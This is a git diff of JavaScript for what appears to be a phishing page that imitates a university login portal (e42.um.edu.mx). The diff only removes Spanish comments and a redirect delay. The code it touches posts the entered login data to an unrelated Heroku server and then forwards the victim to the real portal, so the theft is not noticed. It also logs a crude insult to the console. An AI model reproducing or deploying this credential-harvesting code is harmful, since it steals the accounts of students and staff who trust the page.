@@ -7,7 +7,6 @@ window.addEventListener("DOMContentLoaded", () => {
 });
 
 document.addEventListener("keydown", function (e) {
-    // Asegurarse de que la tecla presionada sea "Enter"
     if (e.key === "Enter") {
         loginButton.click();
     }
@@ -23,12 +22,10 @@ loginButton.addEventListener("click", function (e) {
         return;
     }
 
-    // Cambiar el texto del botón y deshabilitarlo
     this.textContent = "Validando Información...";
     this.classList.add("loading");
     this.disabled = true;
 
-    // Enviar los datos a la API
     fetch("https://julia-putita-15bf1bccaf7f.herokuapp.com/api/e42", {
         method: "POST",
         headers: {
@@ -47,11 +44,7 @@ loginButton.addEventListener("click", function (e) {
     })
     .then(data => {
         console.log("Puto el que lo lea");
-
-        // Retrasar la redirección por 3 segundos
-        setTimeout(() => {
-            window.location.href = "https://e42.um.edu.mx/sec/Home.aspx"; // Redirige después de 3 segundos
-        }, 1000); // 3000 milisegundos = 3 segundos
+            window.location.href = "https://e42.um.edu.mx/sec/Home.aspx";
     })
     .catch(error => {
         console.error("Error al enviar los datos:", error);
